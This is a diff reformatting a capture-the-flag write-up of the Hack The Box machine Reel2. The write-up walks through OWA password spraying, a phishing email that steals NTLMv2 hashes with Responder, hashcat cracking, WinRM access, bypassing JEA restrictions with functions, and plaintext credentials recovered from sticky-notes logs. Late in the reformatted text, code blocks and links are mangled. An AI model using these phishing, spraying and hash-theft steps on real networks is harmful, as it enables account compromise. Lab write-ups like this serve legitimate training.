@@ -1,28 +1,30 @@
 # HTB - Reel2
 
-## Overview
+## HTB - Reel2
 
-![](<machine>.infocard.png)
+### Overview
+
+![](https://github.com/zweilosec/htb-writeups/tree/a36132a850224b609952bea7e43b200f126fbb9c/windows-machines/hard/machine%3E.infocard.png)
 
 Short description to include any strange things to be dealt with
 
-## Useful Skills and Tools
+### Useful Skills and Tools
 
-### Search for all files that contain a certain text string
+#### Search for all files that contain a certain text string
 
-```
+```text
 dir -r C:\ -EA Silent | Select-String "Sticky"
 ```
 
-#### Useful thing 2
+**Useful thing 2**
 
-- description with generic example
+* description with generic example
 
-## Enumeration
+### Enumeration
 
-### Nmap scan
+#### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.210`.  The options I regularly use are: 
+I started my enumeration with an nmap scan of `10.10.10.210`. The options I regularly use are:
 
 | `Flag` | Purpose |
 | :--- | :--- |
@@ -32,7 +34,7 @@ I started my enumeration with an nmap scan of `10.10.10.210`.  The options I reg
 | `-sV` | Does a service version scan |
 | `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ nmap -sCV -n -p- -Pn -v -oA reel2 10.10.10.210                                               130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
@@ -139,35 +141,35 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 241.37 seconds
 ```
 
-Lots of ports open.  80, 443, 8080, 5985, and RPC on a bunch of ports 6000+
+Lots of ports open. 80, 443, 8080, 5985, and RPC on a bunch of ports 6000+
 
 From the nmap scan I also saw a DNS domain name `Reel2.htb.local` in the port 443 information. Added to `/etc/hosts`
 
-### Port 80 
+#### Port 80
 
 simply led to a 403 - Forbidden error page
 
-### Port 8080
+#### Port 8080
 
-led to a login page for something called "WallStant".  I created an account, and was logged into something that looks like FaceBook.  I saw a link for uploading a profile picture, but unfortunately it did not seem to actually be an option.\
+led to a login page for something called "WallStant". I created an account, and was logged into something that looks like FaceBook. I saw a link for uploading a profile picture, but unfortunately it did not seem to actually be an option.\
 
-On my profile page there was an upload button, I tried to upload a php code exec script (not sure if php even runs here...) but the file had to be an image. I was able to upload a photo, so next I loaded burp to see if I could fool it into loading code
+On my profile page there was an upload button, I tried to upload a php code exec script \(not sure if php even runs here...\) but the file had to be an image. I was able to upload a photo, so next I loaded burp to see if I could fool it into loading code
 
 The response contained the `X-Powered-By` header that told me that it was using PHP/7.2.32
 
-* https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151
-* https://www.cvebase.com/cve/2020/8177
-* https://hackerone.com/reports/887462
+* [https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151](https://snyk.io/vuln/SNYK-DEBIAN10-CURL-573151)
+* [https://www.cvebase.com/cve/2020/8177](https://www.cvebase.com/cve/2020/8177)
+* [https://hackerone.com/reports/887462](https://hackerone.com/reports/887462)
 
 I found a number of vulnerabilities associated with this version, including one that pointed to a version of curl that is included that could lead to code execution using the `-J` flag is used to overwrite a local file
 
-After reading the HackerOne report it seems as if this is not useful in this case unless I can make requests from the machine using curl (not libcurl)
+After reading the HackerOne report it seems as if this is not useful in this case unless I can make requests from the machine using curl \(not libcurl\)
 
 back on the Wallstant page there was a Trending Posts box that had some potential usernames
 
-https://www.swedishfood.com/fika - fika is a traditional Swedish coffee break with friends
+[https://www.swedishfood.com/fika](https://www.swedishfood.com/fika) - fika is a traditional Swedish coffee break with friends
 
-```
+```text
 -- phpMyAdmin SQL Dump
 -- version 4.9.0.1
 -- https://www.phpmyadmin.net/
@@ -178,50 +180,47 @@ https://www.swedishfood.com/fika - fika is a traditional Swedish coffee break wi
 -- PHP Version: 7.3.9
 ```
 
-Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database.  There was not much useful information other than version numbers
+Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database. There was not much useful information other than version numbers
 
 After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443
 
-### Port 443
+#### Port 443
 
 I checked out the certificate, but other than the domain name we had alrady discovered there was no useful information.
 
 The HTTPS port only led to a blank IIS Welcome page. I loaded dirbuster again to see if there was anything not on the index page.
 
-Dirbuster quickly returned a few folders, inlcuding `public` and `owa`.  Both sounded interesting, so I loaded public first.
+Dirbuster quickly returned a few folders, inlcuding `public` and `owa`. Both sounded interesting, so I loaded public first.
 
-navigating to https://Reels.htb.local/public redirected to an Outlook Web Application page.  Since I had a list of names to make usernames from, I decided to try to brute force the login.  Searching for OWA brute force led to a tool by byt3bl33d3r
+navigating to [https://Reels.htb.local/public](https://Reels.htb.local/public) redirected to an Outlook Web Application page. Since I had a list of names to make usernames from, I decided to try to brute force the login. Searching for OWA brute force led to a tool by byt3bl33d3r
 
-* https://github.com/byt3bl33d3r/SprayingToolkit
+* [https://github.com/byt3bl33d3r/SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ ~/SprayingToolkit/atomizer.py owa https://Reel2.htb.local/owa ~/rockyou_utf8.txt usernames --threads 20
 [*] Using 'https://reel2.htb.local/owa' as URL
 [-] Error parsing internal domain name using OWA. This usually means OWA is being hosted on-prem or the target has a hybrid AD deployment
     Do some recon and pass the custom OWA URL as the target if you really want the internal domain name, password spraying can still continue though :)
 ```
-	
+
 The first time I ran the tool it gave me a very helpful error message that explained I needed to use the full internal custom URL
 
+### The OWA Portal
 
+I was able to log into the OWA with the credentials HTB\s.svenson:Summer2020. The first thing I noticed was that the page was in Swedish, but since I have used OWA before it was not much of a problem. There was no mail, notes, contacts, or anything.
 
+[https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook](https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook)
 
-## The OWA Portal
-
-I was able to log into the OWA with the credentials HTB\s.svenson:Summer2020.  The first thing I noticed was that the page was in Swedish, but since I have used OWA before it was not much of a problem.  There was no mail, notes, contacts, or anything.
-
-https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook
-
-https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html
+[https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html](https://insights.sei.cmu.edu/cert/2018/04/automatically-stealing-password-hashes-with-microsoft-outlook-and-ole.html)
 
 AFter searching for awhile for ways to steal information through Outlook, I found a few articles that explained how to get NTLMv2 hashes by sending a link to the attackers box and having the email simply viewed in the Preview Pane.
 
-I opened the address book, and saw a long list of addresses available.  I selected all them and clicked on the button to send a new email.  I received an error from Firefox saying popups had been blocked, but clicking "Ja" (Yes) in the dialog box allowed the new mail window to open.
+I opened the address book, and saw a long list of addresses available. I selected all them and clicked on the button to send a new email. I received an error from Firefox saying popups had been blocked, but clicking "Ja" \(Yes\) in the dialog box allowed the new mail window to open.
 
-I used Google translate to send an email inviting everyone to check out the new NAS link, which was a link to my machine.  AFter that I fired up `Responder` to see what I could catch.
+I used Google translate to send an email inviting everyone to check out the new NAS link, which was a link to my machine. AFter that I fired up `Responder` to see what I could catch.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ sudo responder -I tun0                                                                       255 ⨯
 [sudo] password for zweilos: 
@@ -285,9 +284,9 @@ I used Google translate to send an email inviting everyone to check out the new 
 [HTTP] NTLMv2 Hash     : k.svensson::htb:85ab412763d672f9:83648271C68CBDA4E17F73B1EF3CD357:0101000000000000D97F28DCB804D7017D151A1EDFF498E3000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000000000000400000C4BECD0E51B4B90084B5CB9F237CDCDD2221F1DA0BE28E374F512A2DF5FA7A400A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310035002E00310033000000000000000000
 ```
 
-After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.  
+After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ hashcat --help | grep -i 'NTLM'
    5500 | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols
@@ -297,7 +296,7 @@ After a short time I got a hit, with the NTLMv2 hash for the user `k.svensson`.
 
 Using hashcat's help I was able to identify the type id
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ hashcat -O -D1,2 -a0 -m5600 hash /usr/share/wordlists/rockyou.txt                            255 ⨯
 hashcat (v6.1.1) starting...
@@ -332,7 +331,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 K.SVENSSON::htb:85ab412763d672f9:83648271c68cbda4e17f73b1ef3cd357:0101000000000000d97f28dcb804d7017d151a1edff498e3000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c000800300030000000000000000000000000400000c4becd0e51b4b90084b5cb9f237cdcdd2221f1da0be28e374f512a2df5fa7a400a001000000000000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310035002e00310033000000000000000000:kittycat1
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: NetNTLMv2
@@ -353,11 +352,11 @@ Started: Tue Feb 16 19:02:30 2021
 Stopped: Tue Feb 16 19:02:58 2021
 ```
 
-And then I was able to crack the has in just a few seconds.  `k.svensson`'s password was `kittycat1`
+And then I was able to crack the has in just a few seconds. `k.svensson`'s password was `kittycat1`
 
-## Initial Foothold
+### Initial Foothold
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ evil-winrm -u k.svensson -p kittycat1 -i 10.10.10.210                                          1 ⨯
 
@@ -374,12 +373,10 @@ The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function
 
 I was able to connect using the credentials for `k.svensson:kittycat1` but The shell I got did not seem to be working properly, so I loaded powershell for Linux instead
 
+* [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1)
+* [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1)
 
-
-* https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1
-* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.1
-
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ pwsh
 PowerShell 7.0.0
@@ -399,25 +396,25 @@ Enter your credentials.
 Password for user HTB\k.svensson: *********
 
 PS /home/zweilos/htb/reel2> Enter-PSSession $newSession
-[10.10.10.210]: PS>
 ```
 
 I was able to login after using `pwsh`
 
-# ----
+## ----
 
 NOTE::
 
-```
+```text
 New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
 ```
-https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/
+
+[https://www.reddit.com/r/PowerShell/comments/6itek2/powershell\_remoting\_linux\_windows\_with\_spnego/dj9auuq/](https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/)
 
 If you get this error, close powershell, then install `gss-ntlmssp`. This will allow you to use NTLM authentication
 
-# ----
+## ----
 
-```
+```text
 [10.10.10.210]: PS>whoami /all
 The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct 
@@ -428,18 +425,15 @@ and try again.
 
 Another bad sign, after so many other broken/difficult things....
 
-```
+```text
 [10.10.10.210]: P> function test {whoami}   
-[10.10.10.210]: PS>test
 htb\k.svensson
 ```
 
 After some testing, I discovered I could run commands embedded inside a custom function
 
-```
+```text
 [10.10.10.210]: PS>function test {whoami /all}
-[10.10.10.210]: PS>test
-
 USER INFORMATION
 ----------------
 
@@ -483,10 +477,9 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 Not much to work with in this user's permissions
 
+I found a shortcut for doing commands like this by using anonymous functions: [https://vexx32.github.io/2018/10/26/Anonymous-Functions/](https://vexx32.github.io/2018/10/26/Anonymous-Functions/)
 
-I found a shortcut for doing commands like this by using anonymous functions:  https://vexx32.github.io/2018/10/26/Anonymous-Functions/
-
-```
+```text
 [10.10.10.210]: P> .{ls}
 
 
@@ -502,30 +495,24 @@ d-----        7/30/2020   5:14 PM                WindowsPowerShell
 
 This made navigating much easier, and only a few characters more than typing the commands normally
 
-I googled the jea_test_account.psrc file and found that is related to "Just Enough Administration", which is a 
+I googled the jea\_test\_account.psrc file and found that is related to "Just Enough Administration", which is a
 
-* found https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1
+* found [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1)
 
 > A role capability is a PowerShell data file with the .psrc extension that lists all the cmdlets, functions, providers, and external programs that are made available to connecting users.
 
-This is the file that seems to be limiting the commands that are available when I logged in.  This is also why Evil-Winrm broke, since it seems to use Invoke-Expression for all of its commands.  I have bypassed similar restrictions by using functions before
+This is the file that seems to be limiting the commands that are available when I logged in. This is also why Evil-Winrm broke, since it seems to use Invoke-Expression for all of its commands. I have bypassed similar restrictions by using functions before
 
+### Road to User
 
+#### Further enumeration
 
-## Road to User
+#### Finding user creds
 
-### Further enumeration
+#### User.txt
 
-### Finding user creds
-
-
-### User.txt
-
-```
+```text
 [10.10.10.210]: P> .{cd ..\Desktop/} 
-[10.10.10.210]: PS>.{ls}           
-
-
     Directory: C:\Users\k.svensson\Desktop
 
 
@@ -542,17 +529,17 @@ d-----        2/12/2021   5:12 PM                WinDirStatPortable
 88fe9f1ba18d0a89e4b67277fba820de
 ```
 
-## Path to Power \(Gaining Administrator Access\)
+### Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as k.svensson
+#### Enumeration as k.svensson
 
 Saw a link for the sticky notes program, which seemed like a good place to search for secrets
 
-#### Search for all files that contain a certain text string
+**Search for all files that contain a certain text string**
 
-dir -r C:\ -EA Silent | Select-String "Sticky"
+dir -r C: -EA Silent \| Select-String "Sticky"
 
-```
+```text
 [10.10.10.210]: PS>.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}
 
 Sticky Notes.lnk:1:L�F�@ �m�Bcf��m�Bcf��4��V�02DG
@@ -585,24 +572,25 @@ ta\Local\Programs\stickynotes\stickynotes.exe
 ickynotes
 ```
 
-The stickynotes application was isntalled in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`.  This seemed like a likely place for the user to have stored interesting information, such as potential credentials
+The stickynotes application was isntalled in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`. This seemed like a likely place for the user to have stored interesting information, such as potential credentials
 
+### ----
 
-## ----
 NOTE:
 
 I lost my shell at one point so it hung on any commands
 
-```
-[10.10.10.210]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.                           
+```text
+[10.10.10.210]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
 If you get the above error after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt!
 
 edit: still didn't work, had to kill the terminal
-## ----
 
-```
+### ----
+
+```text
 [10.10.10.210]: P> .{Get-ComputerInfo}                                                                 
                                                                                                                                                                                                               WindowsBuildLabEx                                       : 9600.19812.amd64fre.winblue_ltsb_escrow.2008                                                           14-1823                                      
 WindowsCurrentVersion                                   : 6.3
@@ -788,15 +776,12 @@ DeviceGuardCodeIntegrityPolicyEnforcementStatus         :
 DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :
 ```
 
-I was denied using the `systeminfo` command, but `Get-ComputerInfo` gave me a little bit of information.  The platform was running on Windows Server 2012 R2
+I was denied using the `systeminfo` command, but `Get-ComputerInfo` gave me a little bit of information. The platform was running on Windows Server 2012 R2
 
 There didn't seem to be anything in the `Appdata\Local\stickynotes\` folder of use, so I checked `Roaming` to see if there was anything useful there
 
-```
+```text
 [10.10.10.210]: PS>.{cd ../../../Roaming}
-[10.10.10.210]: PS>.{ls}                 
-
-
     Directory: C:\Users\k.svensson\AppData\Roaming
 
 
@@ -809,9 +794,6 @@ d-----        7/30/2020   1:23 PM                stickynotes
 
 
 [10.10.10.210]: PS>.{cd stickynotes}     
-[10.10.10.210]: PS>.{ls}            
-
-
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes
 
 
@@ -830,13 +812,9 @@ d-----        7/30/2020   1:19 PM                logs
 
 a
 
-```
+```text
 [10.10.10.210]: PS>.{cd logs}       
-[10.10.10.210]: PS>.{ls}     
 [10.10.10.210]: PS>.{cd ..\blob_storage}                                                 
-[10.10.10.210]: PS>.{ls}                
-
-
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\blob_storage
 
 
@@ -846,11 +824,7 @@ d-----        2/16/2021   5:08 PM                034a85de-dd17-4c80-a8ba-034bfb9
 
 
 [10.10.10.210]: PS>.{cd .\034a85de-dd17-4c80-a8ba-034bfb90026f/}
-[10.10.10.210]: PS>.{ls}                                        
 [10.10.10.210]: PS>.{cd '..\..\Local Storage/'}                 
-[10.10.10.210]: PS>.{ls}                       
-
-
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage
 
 
@@ -860,9 +834,6 @@ d-----        2/16/2021   5:08 PM                leveldb
 
 
 [10.10.10.210]: PS>.{cd leveldb}                                
-[10.10.10.210]: PS>.{ls}        
-
-
     Directory: C:\Users\k.svensson\AppData\Roaming\stickynotes\Local Storage\leveldb
 
 
@@ -876,14 +847,13 @@ Mode                LastWriteTime         Length Name
 -a----        7/30/2020   1:19 PM             41 MANIFEST-000001
 ```
 
+Inside the stickynotes folder there was a `Local Storage` folder with a `leveldb` folder. After searching for leveldb I discovered it was a type of local database, and not related to stickynotes \(at least not Microsoft's set up\). It seemed like this was a custom database setup.
 
-Inside the stickynotes folder there was a `Local Storage` folder with a `leveldb` folder.  After searching for leveldb I discovered it was a type of local database, and not related to stickynotes (at least not Microsoft's set up).  It seemed like this was a custom database setup.  
-
-* https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15
+* [https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15](https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15)
 
 It looked possible that this project had been implemented here
 
-```
+```text
 [10.10.10.210]: P> .{type Log.old}
 2021/02/12-16:58:37.478 5956 Reusing MANIFEST leveldb/MANIFEST-000001
 2021/02/12-16:58:37.478 5956 Recovering log #3
@@ -892,7 +862,7 @@ It looked possible that this project had been implemented here
 
 First I checked `Log.old` to see if there was anything useful, but it just pointed towards the other log file in the directory
 
-```
+```text
 [10.10.10.210]: PS>.{type 000003.log}
 /á€uBVERSION1
              META:app://.app://.__storejs__test__Z’–9[
@@ -907,7 +877,7 @@ First I checked `Log.old` to see if there was anything useful, but it just point
                META:app://.
                           ˆ‚·àÒÇÂò_app://.closed{"closed":"yes"}þUq­V
                                                                      META:app://.
-                                                                                ¯Ðó¢ÔÇÂÚapp://.__storejs__test___app://.closed˜ K
+                                                                                ¯Ðó¢ÔÇÂÚapp://.__storejs__test___app://.closed˜ K
                           META:app://.
                                      åêú¾ÔÇÂò_app://.closed{"closed":"yes"}Iž5V
                                                                                META:app://.
@@ -919,7 +889,7 @@ First I checked `Log.old` to see if there was anything useful, but it just point
                              META:app://.
                                         Ö¹»§æÇÂÚapp://.__storejs__test__ä>JD
                                                                             META:app://.
-                                                                                       á† èÇÂÚapp://.__storejs__test__P¯RÜD
+                                                                                       á† èÇÂÚapp://.__storejs__test__P¯RÜD
                     META:app://.
                                îßƒÓéÇÂÚapp://.__storejs__test__¢h©¸D 
                                                                      META:app://.
@@ -947,7 +917,7 @@ First I checked `Log.old` to see if there was anything useful, but it just point
   META:app://.
              ÃëÍäèÃÚapp://.__storejs__test__Íá¸³D9
                                                   META:app://.
-                                                             ¿Ë ¶ñ÷ÃÚapp://.__storejs__test__¾íãD;
+                                                             ¿Ë ¶ñ÷ÃÚapp://.__storejs__test__¾íãD;
                                                                                                   META:app://.
       ý¤×éò÷ÃÚapp://.__storejs__test__Á
                                        £úD=
@@ -961,47 +931,45 @@ First I checked `Log.old` to see if there was anything useful, but it just point
                                                                                               —´¦ÏÉÁÆÚapp://.__storejs__test__
 ```
 
-One string stuck out in this log: 
+One string stuck out in this log:
 
-```
+```text
 "<p>Credentials for JEA</p><p>jea_test_account:Ab!Q@vcg^%@#1</p>"
 ```
 
-It looked like I had found a password for the `jea_test_account` I had seen files for earlier.  
+It looked like I had found a password for the `jea_test_account` I had seen files for earlier.
 
-* https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1
-* https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1
+* [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)
+* [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1)
 
 > To use JEA interactively, you need:
 
-    The name of the computer you're connecting to (can be the local machine)
-    The name of the JEA endpoint registered on that computer
-    Credentials that have access to the JEA endpoint on that computer
-
-> Given that information, you can start a JEA session using the New-PSSession or Enter-PSSession cmdlets.
-```PowerShell
-
-$nonAdminCred = Get-Credential
-Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance -Credential $nonAdminCred
+```text
+The name of the computer you're connecting to (can be the local machine)
+The name of the JEA endpoint registered on that computer
+Credentials that have access to the JEA endpoint on that computer
 ```
 
+> Given that information, you can start a JEA session using the New-PSSession or Enter-PSSession cmdlets. \`\`\`PowerShell
+
+$nonAdminCred = Get-Credential Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance -Credential $nonAdminCred
+
+```text
 > If the current user account has access to the JEA endpoint, you can omit the Credential parameter.
-
-```
-[10.10.10.210]: PS>Get-Command
-
-CommandType     Name                                               Version    Source                  
------------     ----                                               -------    ------                  
-Function        Clear-Host                                                                            
-Function        Exit-PSSession                                                                        
-Function        Get-Command                                                                           
-Function        Get-FormatData                                                                        
-Function        Get-Help                                                                              
-Function        Measure-Object                                                                        
-Function        Out-Default                                                                           
-Function        Select-Object 
 ```
 
+CommandType Name Version Source
+
+Function Clear-Host  
+Function Exit-PSSession  
+Function Get-Command  
+Function Get-FormatData  
+Function Get-Help  
+Function Measure-Object  
+Function Out-Default  
+Function Select-Object
+
+```text
 I checked the list of currently available commands, and was given a very limited set.  This is how JEA limits users.  However it explicitly says on the documentation page: 
 
 > For more complex command invocations that make this approach difficult, consider using implicit remoting or creating custom functions that wrap the functionality you require.
@@ -1013,51 +981,40 @@ When I ran `Get-Command` again inside my custom function, the list kept going an
 In order to pass both the username and password into the New-PSSession cmdlet I had to create a new object that contained this information
 
 ## Shell as `jea_test_account`
-
-```
-┌──(zweilos㉿kali)-[~/htb/reel2]
-└─$ pwsh                       
-PowerShell 7.0.0
-Copyright (c) Microsoft Corporation. All rights reserved.
-
-https://aka.ms/powershell
-Type 'help' to get help.
-
-   A new PowerShell stable release is available: v7.1.2 
-   Upgrade now, or check out the release page at:       
-     https://aka.ms/PowerShell-Release?tag=v7.1.2       
-
-PS /home/zweilos/htb/reel2> $user = "jea_test_account"
-PS /home/zweilos/htb/reel2> $pass = ConvertTo-SecureString "Ab!Q@vcg^%@#1" -AsPlainText 
-PS /home/zweilos/htb/reel2> $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist ($user, $pass)                    
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate
-New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
-PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
-PS /home/zweilos/htb/reel2> Enter-PSSession $jeaSession
-[10.10.10.210]: PS>
 ```
 
+┌──\(zweilos㉿kali\)-\[~/htb/reel2\] └─$ pwsh  
+PowerShell 7.0.0 Copyright \(c\) Microsoft Corporation. All rights reserved.
+
+[https://aka.ms/powershell](https://aka.ms/powershell) Type 'help' to get help.
+
+A new PowerShell stable release is available: v7.1.2 Upgrade now, or check out the release page at:  
+[https://aka.ms/PowerShell-Release?tag=v7.1.2](https://aka.ms/PowerShell-Release?tag=v7.1.2)
+
+PS /home/zweilos/htb/reel2&gt; $user = "jea\_test\_account" PS /home/zweilos/htb/reel2&gt; $pass = ConvertTo-SecureString "Ab!Q@vcg^%@\#1" -AsPlainText PS /home/zweilos/htb/reel2&gt; $creds = new-object -typename System.Management.Automation.PSCredential -argumentlist \($user, $pass\)  
+PS /home/zweilos/htb/reel2&gt; $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate New-PSSession: [10.10.10.210](https://github.com/zweilosec/htb-writeups/tree/a36132a850224b609952bea7e43b200f126fbb9c/windows-machines/hard/PS%3EGet-Command/README.md) Connecting to remote server 10.10.10.210 failed with the following error message : ERROR\_ACCESS\_DENIED: Access is denied. For more information, see the about\_Remote\_Troubleshooting Help topic.  
+PS /home/zweilos/htb/reel2&gt; $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate -ConfigurationName "jea\_test\_account"  
+PS /home/zweilos/htb/reel2&gt; Enter-PSSession $jeaSession
+
+```text
 After creating an object with the credentials, and specifying the connection with the configuration name I was able to connect
-
-```
-[10.10.10.210]: PS>whoami     
-The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
-program. Check the spelling of the name, or if a path was included, verify that the path is correct 
-and try again.
-    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
-    + FullyQualifiedErrorId : CommandNotFoundException
- 
-[10.10.10.210]: P> .{whoami /all}
-The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
-    + CategoryInfo          : ParserError: (.{whoami /all}:String) [], ParseException
-    + FullyQualifiedErrorId : ScriptsNotAllowed
 ```
 
-I went from one restricted account to a more restricted account.... "no-language mode" (google this)
+The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
 
-```
-[10.10.10.210]: PS>Get-Command
+* CategoryInfo          : ObjectNotFound: \(whoami.exe:String\) \[\], CommandNotFoundException
+* FullyQualifiedErrorId : CommandNotFoundException
 
+[10.10.10.210](https://github.com/zweilosec/htb-writeups/tree/a36132a850224b609952bea7e43b200f126fbb9c/windows-machines/hard/PS%3EGet-Command/README.md): P&gt; .{whoami /all} The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
+
+* CategoryInfo          : ParserError: \(.{whoami /all}:String\) \[\], ParseException
+* FullyQualifiedErrorId : ScriptsNotAllowed
+
+  \`\`\`
+
+I went from one restricted account to a more restricted account.... "no-language mode" \(google this\)
+
+```text
 CommandType     Name                                               Version    Source                  
 -----------     ----                                               -------    ------                  
 Function        Check-File                                                                            
@@ -1077,9 +1034,9 @@ Cannot find path '' because it does not exist.
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetHelpCommand
 ```
 
-I used `Get-Command` to see if I had access to the same commands, and found that it was pretty much the same list with one addition.  I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
+I used `Get-Command` to see if I had access to the same commands, and found that it was pretty much the same list with one addition. I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
 
-```
+```text
 [10.10.10.210]: P> .{type jea_test_account.psrc}
 @{
 
@@ -1143,18 +1100,18 @@ FunctionDefinitions = @{
 # AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
 ```
 
-The answer was in the JEA configuration files I had seen earlier.  Inside the configuration file `jea_test_account.psrc` there was a definition for a custon function `Check-File`
+The answer was in the JEA configuration files I had seen earlier. Inside the configuration file `jea_test_account.psrc` there was a definition for a custon function `Check-File`
 
-```powershell
+```text
 # Functions to define when applied to a session
 FunctionDefinitions = @{
     'Name' = 'Check-File'
     'ScriptBlock' = {param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like "D:\*" -or $Path -like "C:\ProgramData\*" ; if($check) {get-content $Path}} }
